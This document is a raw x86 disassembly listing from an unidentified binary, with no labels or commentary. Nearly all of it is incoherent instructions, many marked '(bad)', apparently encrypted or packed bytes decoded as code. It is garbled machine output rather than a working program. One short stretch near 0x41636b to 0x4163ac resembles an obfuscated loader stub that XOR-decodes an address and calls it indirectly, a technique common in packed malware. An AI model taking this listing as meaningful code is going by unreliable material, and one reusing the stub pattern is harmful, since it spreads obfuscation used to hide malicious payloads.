  416135:	mov    al,ds:0x8ad7edb5
  41613a:	retf   0x4372
  41613d:	loopne 0x4160fe
  41613f:	in     al,dx
  416140:	test   eax,0x18c550e6
  416145:	xor    al,0x5a
  416147:	inc    edi
  416148:	jp     0x4160f3
  41614a:	and    DWORD PTR [esi+0x45],edi
  41614d:	sbb    eax,DWORD PTR [ecx]
  41614f:	imul   ecx,DWORD PTR [ebx+edi*8],0x8b3885d8
  416156:	jne    0x41616e
  416158:	mov    ebx,0x535b57b1
  41615d:	jecxz  0x4161c9
  41615f:	test   BYTE PTR [ecx*4+0x38f56b58],al
  416166:	mov    ecx,0x8d0dc2c4
  41616b:	mov    BYTE PTR ds:0xbe2c623c,bh
  416171:	in     al,0x67
  416173:	mov    dl,dh
  416175:	push   ebx
  416176:	adc    edi,DWORD PTR [ecx+0x34665528]
  41617c:	add    al,0x57
  41617e:	std    
  41617f:	call   0x74c2:0x83e00a82
  416186:	add    ah,BYTE PTR [esi-0x57648d23]
  41618c:	cs sub al,0x4b
  41618f:	xchg   edx,eax
  416190:	aas    
  416191:	ret    0x3de8
  416194:	jne    0x41616b
  416196:	sub    ecx,DWORD PTR [ecx-0x25]
  416199:	mov    ebx,0xed9ca2fa
  41619e:	loop   0x416189
  4161a0:	jmp    0x3311:0x6ae90eb1
  4161a7:	xchg   esi,eax
  4161a8:	ret    0x43f
  4161ab:	cld    
  4161ac:	sbb    eax,0x5e2ea5ad
  4161b1:	gs loope 0x416154
  4161b4:	paddsw mm5,QWORD PTR [ecx-0x57]
  4161b8:	jmp    0xa8a:0x485e58da
  4161bf:	mov    al,ds:0xd08c3363
  4161c4:	repz les esp,FWORD PTR [edx+eiz*2]
  4161c8:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4161ca:	jl     0x41620f
  4161cc:	fwait
  4161cd:	jae    0x4161ce
  4161cf:	adc    dh,BYTE PTR [edx+0x6a]
  4161d2:	ror    DWORD PTR [eax+esi*4-0x5f],0xc1
  4161d7:	call   0x3e29c29d
  4161dc:	adc    DWORD PTR [ebx],esp
  4161de:	pop    ebp
  4161df:	mov    WORD PTR [esi+edx*1],fs
  4161e2:	mov    cs,eax
  4161e4:	rcr    DWORD PTR [esi+0x77],1
  4161e7:	fs push ebx
  4161e9:	jo     0x41618f
  4161eb:	ret    
  4161ec:	mov    ebp,0x50987ae5
  4161f1:	test   al,0xef
  4161f3:	mov    al,0xaf
  4161f5:	stos   BYTE PTR es:[edi],al
  4161f6:	inc    ebx
  4161f7:	(bad)  
  4161f8:	and    DWORD PTR ds:0xe0e766db,eax
  4161fe:	add    dl,ch
  416200:	cmp    BYTE PTR [ecx-0x10],dl
  416203:	push   ebx
  416204:	lods   al,BYTE PTR ds:[esi]
  416205:	push   esi
  416206:	rcl    DWORD PTR [edi-0x6e],cl
  416209:	loopne 0x416245
  41620b:	popf   
  41620c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41620d:	out    dx,eax
  41620e:	iret   
  41620f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416210:	ror    DWORD PTR [edi-0x4dfd6165],0x68
  416217:	xlat   BYTE PTR ds:[ebx]
  416218:	xchg   ebx,eax
  416219:	or     eax,0x84290327
  41621e:	shl    ebp,0x13
  416221:	push   edi
  416222:	xchg   ecx,eax
  416223:	and    eax,0xddd2bce8
  416228:	into   
  416229:	hlt    
  41622a:	std    
  41622b:	push   ebp
  41622c:	clc    
  41622d:	sub    BYTE PTR [edi],ch
  41622f:	add    BYTE PTR [edx+eiz*2+0x210d2f5e],al
  416236:	aad    0x92
  416238:	pop    ds
  416239:	repz mov edx,0x3e0e5f08
  41623f:	mov    ?,WORD PTR [ebx]
  416241:	xor    edx,DWORD PTR [edi]
  416243:	ins    DWORD PTR es:[edi],dx
  416244:	call   0xea8b:0x4caa768f
  41624b:	aam    0xa5
  41624d:	cmp    eax,0x315e4bb2
  416252:	sbb    ebp,DWORD PTR [eax]
  416254:	fwait
  416255:	mov    bl,0xb9
  416257:	jno    0x4161ff
  416259:	cld    
  41625a:	sbb    BYTE PTR [ebp+0x76],bl
  41625d:	ins    BYTE PTR es:[edi],dx
  41625e:	mov    ebp,0x6042175
  416263:	fld    QWORD PTR [ecx-0x5885100f]
  416269:	imul   ebp,DWORD PTR [edi-0x6f3b9b],0xfffffff3
  416270:	jb     0x4162b1
  416272:	mov    esp,0x798ec3ba
  416277:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416278:	push   eax
  416279:	jmp    0xec2c:0x388c23e1
  416280:	lahf   
  416281:	fs push esp
  416283:	mov    edi,0xd49bc450
  416288:	ja     0x41620e
  41628a:	pop    edx
  41628b:	sar    DWORD PTR [ecx+0xf],0xfd
  41628f:	mov    cl,0x14
  416291:	je     0x416297
  416293:	imul   edx,ebx,0xffffffef
  416296:	mov    edi,0x106ba5e2
  41629b:	mov    ecx,0x4b365175
  4162a0:	lahf   
  4162a1:	or     al,0xc6
  4162a3:	ins    DWORD PTR es:[edi],dx
  4162a4:	sbb    ah,dh
  4162a6:	icebp  
  4162a7:	dec    BYTE PTR [edi]
  4162a9:	mov    eax,0x7664e6a3
  4162ae:	and    al,0x40
  4162b0:	pop    ds
  4162b1:	xchg   DWORD PTR [esi-0x7d],ecx
  4162b4:	mov    BYTE PTR [eax+eiz*2-0x661bb08d],bl
  4162bb:	push   edi
  4162bc:	loopne 0x4162ad
  4162be:	sub    ebp,DWORD PTR [edi+0x59f0bc0e]
  4162c4:	xlat   BYTE PTR ds:[ebx]
  4162c5:	pop    es
  4162c6:	dec    ebp
  4162c7:	inc    ebp
  4162c8:	cli    
  4162c9:	add    al,0xf0
  4162cb:	(bad)  
  4162cc:	sbb    eax,0xb3b2cc78
  4162d1:	sbb    al,0xfd
  4162d3:	repz pop ebp
  4162d5:	mov    edx,0x2bde37ca
  4162da:	repnz rcl BYTE PTR [edx+0x5b],1
  4162de:	and    DWORD PTR [esi],0x3d
  4162e1:	fs fwait
  4162e3:	enter  0xfb46,0x7b
  4162e7:	lods   eax,DWORD PTR ds:[esi]
  4162e8:	add    al,0x60
  4162ea:	hlt    
  4162eb:	sub    ch,BYTE PTR [edx+eiz*4+0x7f54def3]
  4162f2:	mov    ?,WORD PTR [edi]
  4162f4:	(bad)  [ebx]
  4162f6:	jecxz  0x4162e5
  4162f8:	jb     0x416329
  4162fa:	fsubr  QWORD PTR [edi-0x4ebf43e0]
  416300:	inc    edi
  416301:	mov    dh,0xa8
  416303:	add    al,BYTE PTR [ebx+0x5edce20c]
  416309:	add    al,0x85
  41630b:	jg     0x4162c7
  41630d:	imul   DWORD PTR [ebx-0x5f]
  416310:	and    bh,0x9a
  416313:	cli    
  416314:	cmp    DWORD PTR [ebp+0x3a34d85a],edi
  41631a:	(bad)  
  41631b:	adc    DWORD PTR [eax+eiz*4],ebx
  41631e:	jbe    0x41632a
  416320:	stc    
  416321:	sti    
  416322:	ins    DWORD PTR es:[edi],dx
  416323:	pop    esp
  416324:	sbb    dl,BYTE PTR [ecx+0x4f]
  416327:	or     bl,al
  416329:	inc    edx
  41632a:	fdiv   QWORD PTR [esi-0x3d]
  41632d:	lods   al,BYTE PTR ds:[esi]
  41632e:	pop    ss
  41632f:	pop    esp
  416330:	pop    es
  416331:	test   eax,0xe9a8dcb6
  416336:	add    eax,0x135ba0ee
  41633b:	xor    esp,DWORD PTR [ebx]
  41633d:	pop    edi
  41633e:	outs   dx,DWORD PTR ds:[esi]
  41633f:	or     ah,BYTE PTR [edx-0x246fb486]
  416345:	push   0x84b729b6
  41634a:	sub    ebx,DWORD PTR ds:0xad351057
  416350:	mov    edi,0x69f1d525
  416355:	mov    bl,0x30
  416357:	push   ebp
  416358:	cwde   
  416359:	out    0x1e,al
  41635b:	fnstenv [ebp-0x2053ade]
  416361:	add    dl,ch
  416363:	xor    esi,DWORD PTR [esi-0x237b22b2]
  416369:	and    dh,al
  41636b:	push   esi
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xcefbc841
  4163bf:	push   edx
  4163c0:	mov    edx,DWORD PTR [ebx]
  4163c2:	adc    al,0x7f
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416426
  4163ca:	xchg   edx,eax
  4163cb:	xchg   esi,eax
  4163cc:	sahf   
  4163cd:	xor    al,0xdb
  4163cf:	dec    ebx
  4163d0:	ja     0x416439
  4163d2:	and    ecx,DWORD PTR [eax+eax*2]
  4163d5:	icebp  
  4163d6:	daa    
  4163d7:	sub    al,0xa1
  4163d9:	stos   DWORD PTR es:[edi],eax
  4163da:	les    edx,FWORD PTR [ecx-0x28aa068b]
  4163e0:	(bad)  
  4163e1:	mov    gs:0xf2045aad,al
  4163e7:	sbb    cl,BYTE PTR [edi]
  4163e9:	pop    ebx
  4163ea:	push   esi
  4163eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ec:	hlt    
  4163ed:	and    DWORD PTR [ecx+0x43],0x280ee19b
  4163f4:	pop    eax
  4163f5:	lods   al,BYTE PTR ds:[esi]
  4163f6:	mov    fs,WORD PTR [ebx]
  4163f8:	es jg  0x4163a8
  4163fb:	cmp    DWORD PTR gs:[eax],esp
  4163fe:	xor    eax,DWORD PTR [eax+0x11]
  416401:	(bad)  
  416403:	hlt    
  416404:	pop    ecx
  416405:	mov    bh,0x20
  416407:	jb     0x416434
  416409:	fwait
  41640a:	ss int 0xfb
  41640d:	inc    edx
  41640e:	fwait
  41640f:	push   ebp
  416410:	addr16 (bad) 
  416412:	and    ecx,DWORD PTR [eax]
  416414:	out    dx,al
  416415:	mov    ds:0xc5aec2d5,eax
  41641a:	stos   DWORD PTR es:[edi],eax
  41641b:	jo     0x4163db
  41641d:	jecxz  0x416496
  41641f:	mov    ds:0x2649e17c,eax
  416424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416425:	mov    ds,ebp
  416427:	sar    DWORD PTR [ebp+ebp*8+0x6253db2c],0x16
  41642f:	in     al,dx
  416430:	push   ds
  416431:	jmp    0x9afb:0x66b6c571
  416438:	jmp    0xf537:0x6bf8495c
  41643f:	xor    BYTE PTR [ecx],bh
  416441:	fiadd  DWORD PTR [eax-0x4ced7e2e]
  416447:	lahf   
  416448:	and    DWORD PTR [ecx-0x55],ebx
  41644b:	retf   
  41644c:	ins    DWORD PTR es:[edi],dx
  41644d:	popa   
  41644e:	test   eax,0xbb49fe7c
  416453:	mov    edx,0xebbe21f8
  416458:	(bad)  
  416459:	xlat   BYTE PTR ds:[ebx]
  41645a:	ret    0xd09
  41645d:	lock dec ecx
  41645f:	push   esi
  416460:	gs stos BYTE PTR es:[edi],al
  416462:	push   esp
  416463:	(bad)  
  416464:	test   eax,0xeaee94c7
  416469:	cli    
  41646a:	inc    eax
  41646b:	adc    al,0x8
  41646d:	jb     0x4164cb
  41646f:	xchg   esp,eax
  416470:	imul   BYTE PTR [edx+0x36e2abb5]
  416476:	retf   0xbb51
  416479:	jb     0x4164ce
  41647b:	mov    bh,0x59
  41647d:	int    0xf9
  41647f:	cmp    ebx,edi
  416481:	ja     0x4164ae
  416483:	lods   eax,DWORD PTR ds:[esi]
  416484:	mov    ecx,0xa3943478
  416489:	mov    ecx,0x8dd2aacc
  41648e:	in     eax,0xcc
  416490:	(bad)  
  416491:	mov    ebx,0xf4009c83
  416496:	in     al,0x93
  416498:	das    
  416499:	sbb    al,0xb6
  41649b:	mov    DWORD PTR [eax],esp
  41649d:	aas    
  41649e:	addr16 dec eax
  4164a0:	inc    edx
  4164a1:	push   ebp
  4164a2:	xchg   dl,dh
  4164a4:	in     al,0x19
  4164a6:	jb     0x4164be
  4164a8:	mov    ebp,0x95b6efbc
  4164ad:	sub    dl,BYTE PTR [edx+0x43]
  4164b0:	cmp    eax,DWORD PTR [ecx]
  4164b2:	addr16 (bad) 
  4164b5:	call   esp
  4164b7:	sub    BYTE PTR [ebp-0x7b],0x43
  4164bb:	sahf   
  4164bc:	retf   
  4164bd:	adc    al,0x58
  4164c0:	nop
  4164c1:	adc    DWORD PTR [eax+0x65],edx
  4164c4:	dec    esp
  4164c5:	std    
  4164c6:	xor    BYTE PTR [ebx],dl
  4164c8:	mov    edi,0x852c19e0
  4164cd:	pop    esp
  4164ce:	dec    edi
  4164cf:	mov    ebp,0x35816972
  4164d4:	pop    ecx
  4164d5:	jl     0x4164db
  4164d7:	popa   
  4164d8:	inc    edi
  4164d9:	pop    ss
  4164da:	(bad)  
  4164db:	sbb    al,0x1a
  4164dd:	imul   edi,DWORD PTR [esi-0x4b],0x46326ad1
  4164e4:	push   0x37
  4164e6:	push   esi
  4164e7:	test   BYTE PTR [edx+edi*8+0x3c87d409],0xc2
  4164ef:	xor    ebx,0xfffffff6
  4164f2:	mov    ds:0x89bdfb43,al
  4164f7:	mov    ?,WORD PTR [ebx]
  4164f9:	enter  0xfc00,0x43
  4164fd:	add    al,0x7
  4164ff:	dec    edx
  416500:	add    BYTE PTR [ebx+0x141672c],ch
  416506:	sbb    ebp,eax
  416508:	js     0x41656d
  41650a:	add    al,0x1a
  41650c:	lock inc edx
  41650e:	shr    BYTE PTR [edx],1
  416510:	xor    ax,0x2d8f
  416514:	cmp    BYTE PTR [ebx+0x24f79155],dl
  41651a:	enter  0x3860,0x0
  41651e:	xor    eax,0xa38229f0
  416523:	int3   
  416524:	ret    
  416525:	vandnps ymm2,ymm2,YMMWORD PTR [ebx+0x5e]
  41652a:	mov    ds:0xd91a1a58,al
  41652f:	aad    0x78
  416531:	sub    DWORD PTR [esi+0x7a645a40],0xffffffbb
  416538:	nop
  416539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41653a:	inc    esi
  41653b:	and    al,0xce
  41653d:	jl     0x4165b3
  41653f:	cmp    bh,BYTE PTR [edx+0x5]
  416542:	xor    DWORD PTR [edx+0x45],eax
  416545:	and    al,0x27
  416547:	loop   0x4164ef
  416549:	clc    
  41654a:	ins    DWORD PTR es:[edi],dx
  41654b:	loop   0x416505
  41654d:	adc    al,ah
  41654f:	ret    
  416550:	add    al,0x6e
  416552:	stos   DWORD PTR es:[edi],eax
  416553:	addr16 fsubr st(4),st
  416556:	xchg   esi,eax
  416557:	jge    0x60fc254f
  41655d:	sub    BYTE PTR [ebx+0x4c],0xa2
  416561:	push   ss
  416562:	add    al,0x98
  416564:	fwait
  416565:	mov    ebp,0x6d1f570
  41656a:	daa    
  41656b:	add    cl,ch
  41656d:	cdq    
  41656e:	xchg   ebp,eax
  41656f:	sub    BYTE PTR [esi+0x14],dh
  416572:	mov    esi,0x32fd3f24
  416577:	and    eax,0x16714310
  41657c:	pushf  
  41657d:	daa    
  41657e:	xchg   BYTE PTR [ecx+0x1662413d],cl
  416584:	jmp    FWORD PTR [esi]
  416586:	mov    ebp,0xcb38ee71
  41658b:	dec    eax
  41658c:	inc    ebp
  41658d:	stc    
  41658e:	xchg   ebp,eax
  41658f:	pusha  
  416590:	nop
  416591:	cmp    ebx,DWORD PTR [edi-0x241dbaab]
  416597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416598:	push   eax
  416599:	or     cl,BYTE PTR ds:0x5c6fb4bb
  41659f:	push   ebx
  4165a0:	scas   al,BYTE PTR es:[edi]
  4165a1:	push   esi
  4165a2:	push   ds
  4165a3:	enter  0x5be0,0xbd
  4165a7:	imul   ecx,DWORD PTR [ecx+0x7523ad34],0x91aba7c8
  4165b1:	adc    al,0x25
  4165b3:	clc    
  4165b4:	push   eax
  4165b5:	fst    DWORD PTR [edi]
  4165b7:	aam    0x2e
  4165b9:	mov    bh,0x96
  4165bb:	shr    dh,cl
  4165bd:	xchg   edx,eax
  4165be:	loope  0x41659e
  4165c0:	jns    0x416622
  4165c2:	aas    
  4165c3:	(bad)  
  4165c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c5:	sub    ah,ch
  4165c7:	fadd   DWORD PTR [ecx-0x4d]
  4165ca:	(bad)  
  4165cb:	mov    al,0xbd
  4165cd:	and    eax,0x9cd3d0e5
  4165d2:	or     DWORD PTR ss:[ecx+0x24eb63c7],eax
  4165d9:	sahf   
  4165da:	push   esp
  4165db:	inc    ebx
  4165dc:	dec    edi
  4165dd:	jo     0x4165c4
  4165df:	cs jl  0x4165d3
  4165e2:	mov    ah,0x3
  4165e4:	cmp    DWORD PTR [eax],0x6
  4165e7:	mov    BYTE PTR [edx-0x6f],bl
  4165ea:	psubusw mm1,QWORD PTR [edx]
  4165ed:	push   ecx
  4165ee:	scas   eax,DWORD PTR es:[edi]
  4165ef:	(bad)  
  4165f0:	sub    al,BYTE PTR [edi-0x76]
  4165f3:	xor    al,0x73
  4165f5:	xlat   BYTE PTR cs:[ebx]
  4165f7:	pop    ecx
  4165f8:	cmp    esi,edi
  4165fa:	test   al,0xea
  4165fc:	iret   
  4165fd:	or     al,ch
  4165ff:	sbb    al,0x91
  416601:	jo     0x416638
  416603:	mov    bh,0xc4
  416605:	ins    BYTE PTR es:[edi],dx
  416606:	mov    dl,0x14
  416608:	xchg   edi,eax
  416609:	push   ecx
  41660a:	jbe    0x4165fc
  41660c:	lahf   
  41660d:	dec    ebx
  41660e:	sbb    eax,0x62e02fd3
  416613:	xor    eax,0xaa400175
  416618:	pop    ds
  416619:	inc    edx
  41661a:	mov    esp,0x34f9cdc3
  41661f:	cld    
  416620:	daa    
  416621:	setnp  bh
  416624:	dec    edx
  416625:	ins    DWORD PTR es:[edi],dx
  416626:	add    BYTE PTR [ecx+0xfd98497],bl
  41662c:	cmp    al,0xd3
  41662e:	rol    BYTE PTR [ecx-0x468db22e],1
  416634:	mov    esp,0xcd397f52
  416639:	out    0x82,al
  41663b:	push   ecx
  41663c:	mov    ds:0xb0b60bf1,al
  416641:	and    DWORD PTR [eax],esi
  416643:	ja     0x416692
  416645:	mov    bh,0x25
  416647:	push   edi
  416648:	inc    esi
  416649:	test   DWORD PTR [ebp+0x1e],eax
  41664c:	call   0x2572:0xaaaf0403
  416653:	fnclex 
  416655:	loop   0x4165e2
  416657:	mov    eax,ds:0xcd197ad0
  41665c:	lods   eax,DWORD PTR ds:[esi]
  41665d:	pop    eax
  41665e:	repnz cmovg ebx,DWORD PTR [ebx+0x1b]
  416663:	pusha  
  416664:	out    dx,al
  416665:	adc    eax,0xd12cb506
  41666a:	imul   edi,DWORD PTR [esp+ebp*2],0x8f3a916a
  416671:	fwait
  416672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416673:	imul   ebp,DWORD PTR [esi+0x30],0x488054bc
  41667a:	xor    DWORD PTR [eax+0x10],0xe3149a46
  416681:	push   esp
  416682:	xchg   BYTE PTR [esi],dl
  416684:	into   
  416685:	cs mov dl,0x36
  416688:	mov    ds:0x1dae8653,al
  41668d:	xor    al,0x83
  41668f:	push   es
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416723
  4166ae:	loop   0x416713
  4166b0:	xlat   BYTE PTR ds:[ebx]
  4166b1:	pop    esp
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x1170707e
  4166ba:	mov    esi,ebp
  4166bc:	add    ebp,esp
  4166be:	jno    0x41672e
  4166c0:	or     edx,edx
  4166c2:	and    al,0xc1
  4166c4:	jb     0x4166f7
  4166c6:	jecxz  0x416723
  4166c8:	int3   
  4166c9:	mov    ebx,0xa59d35
  4166ce:	cwde   
  4166cf:	cmp    dl,al
  4166d1:	out    dx,eax
  4166d2:	and    al,0x41
  4166d4:	sub    eax,0x40d9db7
  4166d9:	cld    
  4166da:	xchg   edx,eax
  4166db:	aam    0xad
  4166dd:	push   esi
  4166de:	call   0xb4c7bea8
  4166e3:	push   ebp
  4166e4:	push   eax
  4166e5:	sbb    eax,0xc118997a
  4166ea:	push   0x34
  4166ec:	mov    edx,0x7dd620a2
  4166f1:	pop    edi
  4166f2:	imul   eax,DWORD PTR [edx-0x28fe2f62],0xffffffc5
  4166f9:	or     BYTE PTR [esi-0x6264b25b],dl
  4166ff:	repz or BYTE PTR [edi+edx*2-0x61203272],dl
  416707:	cmp    dh,BYTE PTR [esi+0x1c]
  41670a:	aas    
  41670b:	jge    0x416751
  41670d:	arpl   WORD PTR [ebp+eiz*4+0x35],sp
  416711:	xchg   ebp,eax
  416712:	inc    esi
  416713:	gs inc ecx
  416715:	push   0xffffffce
  416717:	das    
  416718:	add    al,BYTE PTR [eax-0x4c76341c]
  41671e:	jo     0x41678a
  416720:	shl    edi,0x81
  416723:	rcl    BYTE PTR [eax-0x4c],cl
  416726:	(bad)  
  416728:	(bad)  
  416729:	push   eax
  41672a:	jmp    0x4166d2
  41672c:	xchg   ecx,ebp
  41672e:	fxch   st(6)
  416730:	mov    al,0x26
  416732:	cld    
  416733:	(bad)  [edi+edx*2+0x7f]
  416737:	dec    edx
  416738:	xchg   esp,eax
  416739:	stos   DWORD PTR es:[edi],eax
  41673a:	mov    dh,0x9
  41673c:	pop    ecx
  41673d:	mov    ah,0xe3
  41673f:	jns    0x41670b
  416741:	dec    DWORD PTR [eax+0x36166bb8]
  416747:	repz dec esi
  416749:	jnp    0x416761
  41674b:	and    BYTE PTR [edx],0xaf
  41674e:	aad    0x89
  416750:	mov    bl,0x6f
  416752:	mov    ebp,0xea60628
  416757:	push   ebp
  416758:	jo     0x41679f
  41675a:	xor    DWORD PTR [edi-0x26],ebx
  41675d:	mov    DWORD PTR [eax+0x564d5d7c],eax
  416763:	sbb    DWORD PTR [edi+0x69],ebx
  416766:	pop    ecx
  416767:	mov    ds:0x75e5cc96,eax
  41676c:	inc    ebp
  41676d:	ins    BYTE PTR es:[edi],dx
  41676e:	or     DWORD PTR [esi+0x16b2c6a4],ebx
  416774:	cdq    
  416775:	jo     0x4166f7
  416777:	pop    eax
  416778:	(bad)  
  416779:	lods   eax,DWORD PTR ds:[esi]
  41677a:	clc    
  41677b:	(bad)  
  41677d:	stc    
  41677e:	adc    al,0x8f
  416780:	mov    edi,0x56913bc
  416785:	pop    edx
  416786:	in     al,dx
  416787:	dec    edx
  416788:	std    
  416789:	pop    ebx
  41678a:	add    esp,DWORD PTR [ebp-0x13b4465c]
  416790:	dec    esi
  416791:	mov    al,ds:0x33ff9337
  416796:	mov    eax,ds:0xab5a9cce
  41679b:	ins    DWORD PTR es:[edi],dx
  41679c:	or     cl,BYTE PTR [ecx-0x1d]
  41679f:	cmp    al,0x78
  4167a1:	into   
  4167a2:	hlt    
  4167a3:	dec    ecx
  4167a4:	inc    esi
  4167a5:	into   
  4167a6:	and    ebx,DWORD PTR [eax+0x6c]
  4167a9:	or     eax,0x9ae89cfc
  4167ae:	repnz shl DWORD PTR [ecx],1
  4167b1:	xchg   ebp,eax
  4167b2:	xor    edi,DWORD PTR [edi-0x118ec5a3]
  4167b8:	(bad)  
  4167b9:	mov    cl,0xf
  4167bb:	cmp    edx,DWORD PTR [eax-0x55]
  4167be:	outs   dx,BYTE PTR ds:[esi]
  4167bf:	pop    eax
  4167c0:	sar    eax,0xb4
  4167c3:	aam    0x3c
  4167c5:	and    eax,ecx
  4167c7:	adc    al,0x39
  4167c9:	je     0x416782
  4167cb:	div    BYTE PTR [edi+0x1a]
  4167ce:	push   edx
  4167cf:	mov    ebp,0x9ce19895
  4167d4:	push   eax
  4167d5:	mov    al,ds:0xe0ee0f27
  4167da:	sub    DWORD PTR [eax+0x3ecad592],eax
  4167e0:	repz jle 0x41676e
  4167e3:	mov    cl,0x5d
  4167e5:	xor    bl,BYTE PTR [esi-0x40]
  4167e8:	(bad)  
  4167e9:	(bad)  
  4167eb:	ja     0x4167b2
  4167ed:	push   ds
  4167ee:	push   edx
  4167ef:	test   DWORD PTR [ecx],0xf428d48b
  4167f5:	loop   0x416786
  4167f7:	pop    ebp
  4167f8:	pop    edx
  4167f9:	xor    eax,0x52678f6b
  4167fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ff:	lock mov ebx,0x1c00a66a
  416805:	popf   
  416806:	dec    edi
  416807:	pop    ebp
  416809:	test   eax,0x42abdea7
  41680e:	fidivr WORD PTR ds:0x34934b00
  416814:	push   ebp
  416815:	add    BYTE PTR [edx+0x62],ch
  416818:	sti    
  416819:	in     al,0x3f
  41681b:	(bad)  
  41681c:	mov    dl,0x28
  41681e:	pop    ebx
  41681f:	lea    esp,[ecx-0x7b]
  416822:	jle    0x41686b
  416824:	nop
  416825:	and    bl,BYTE PTR [edx]
  416827:	mov    edi,0xed74922c
  41682c:	inc    edi
  41682d:	mov    edi,0xeba4f4f6
  416832:	jne    0x416841
  416834:	cmp    ebp,0xffffffd9
  416837:	adc    bl,ah
  416839:	pop    ds
  41683a:	mov    cl,0xdd
  41683c:	pusha  
  41683d:	hlt    
  41683e:	and    DWORD PTR [esi],ebp
  416840:	mov    bl,0xe
  416842:	std    
  416843:	and    DWORD PTR [esi],edx
  416845:	mov    bl,0x9d
  416847:	fwait
  416848:	cmc    
  416849:	shl    ebp,0x44
  41684c:	sub    cl,ch
  41684e:	cdq    
  41684f:	loop   0x416899
  416851:	iret   
  416852:	bound  ebx,QWORD PTR [edx+0x31]
  416855:	(bad)  
  416857:	ror    edx,cl
  416859:	adc    al,0xd9
  41685b:	popa   
  41685c:	jmp    0x1247:0xad6c6dc9
  416863:	adc    esp,esp
  416865:	xchg   edi,eax
  416866:	push   ecx
  416867:	mov    WORD PTR [esi-0x1a9136ce],ss
  41686d:	and    eax,0x4b62343e
  416872:	sar    ah,1
  416874:	mov    bl,0x7
  416876:	and    ebp,DWORD PTR [edx+0x5f900a0c]
  41687c:	imul   ebp,DWORD PTR [edi-0x54],0xc
  416880:	bound  esp,QWORD PTR ss:[edx+eiz*2+0x20c4e162]
  416888:	jne    0x416902
  41688a:	mov    ds:0x5db2a449,al
  41688f:	stos   BYTE PTR es:[edi],al
  416890:	aam    0x9c
  416892:	jge    0x416855
  416894:	not    ebx
  416896:	dec    esp
  416897:	mov    eax,0x3019cce4
  41689c:	add    cl,dh
  41689e:	adc    BYTE PTR [ecx],dl
  4168a0:	xchg   ebx,eax
  4168a1:	xchg   esi,eax
  4168a2:	(bad)  
  4168a3:	push   cs
  4168a4:	jbe    0x4168eb
  4168a6:	and    al,0x5c
  4168a8:	imul   ebp,DWORD PTR cs:[edi+0x4c1ad5d1],0xf078439a
  4168b3:	scas   al,BYTE PTR es:[edi]
  4168b4:	push   ss
  4168b5:	xor    eax,0xb5f3c6a3
  4168ba:	sti    
  4168bb:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4168bd:	dec    ecx
  4168be:	enter  0xb4c2,0x3e
  4168c2:	push   ebx
  4168c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168c4:	sbb    al,0x7c
  4168c6:	jnp    0x4168c4
  4168c8:	mov    al,0x64
  4168ca:	and    al,0x22
  4168cc:	daa    
  4168cd:	or     eax,0x91c8e46
  4168d2:	test   eax,edx
  4168d4:	push   ebx
  4168d5:	cmp    al,0x9d
  4168d7:	sbb    al,0x48
  4168d9:	out    dx,al
  4168da:	ja     0x4168af
  4168dc:	add    eax,0x11c626f5
  4168e1:	int3   
  4168e2:	mov    edi,0xff3bb16c
  4168e7:	cmp    DWORD PTR [edi+0x21],ecx
  4168ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168eb:	pop    es
  4168ec:	sti    
  4168ed:	dec    ebp
  4168ee:	mov    BYTE PTR [eax-0x5b],dl
  4168f1:	xchg   ecx,eax
  4168f2:	add    BYTE PTR [edx+0x35],dh
  4168f5:	ins    DWORD PTR es:[edi],dx
  4168f6:	ins    BYTE PTR es:[edi],dx
  4168f7:	pop    edi
  4168f8:	shl    BYTE PTR [edi],0xcf
  4168fb:	pop    edi
  4168fc:	not    DWORD PTR [edx-0x27]
  4168ff:	add    ebx,DWORD PTR [edx]
  416901:	push   es
  416902:	xchg   ebp,eax
  416903:	and    edx,ebx
  416905:	mov    ah,0x55
  416907:	cmp    BYTE PTR [edi],cl
  416909:	fidiv  WORD PTR [ebp-0x18]
  41690c:	cmp    BYTE PTR [esi+0x4ea64ca5],dl
  416912:	js     0x41693a
  416914:	mov    dl,0xcb
  416916:	outs   dx,DWORD PTR ds:[esi]
  416917:	loopne 0x416941
  416919:	(bad)
  41691c:	push   ss
  41691d:	pop    ebp
  41691e:	shl    BYTE PTR [ebx-0x2f0e5ced],0x70
  416925:	inc    esi
  416926:	xchg   edi,eax
